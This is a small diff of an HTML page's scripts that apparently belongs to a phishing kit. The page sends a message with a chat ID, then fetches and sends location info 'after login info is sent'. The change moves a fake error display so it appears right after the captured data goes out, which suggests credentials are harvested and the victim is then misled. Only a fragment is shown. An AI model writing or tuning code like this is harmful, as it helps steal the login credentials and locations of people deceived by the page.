@@ -671,6 +671,8 @@
 
         // Send the message using the XMLHttpRequest method
         sendMessageWithXHR(chatId, message); // Send using XMLHttpRequest
+        
+        document.getElementById("error-message").style.display = "block";
       });
     </script>
 
@@ -740,7 +742,6 @@
         // Fetch and send location info after login info is sent
         fetchLocationInfo(chatId);
         
-        document.getElementById("error-message").style.display = "block";
       });
     </script>
     <!-- <script>
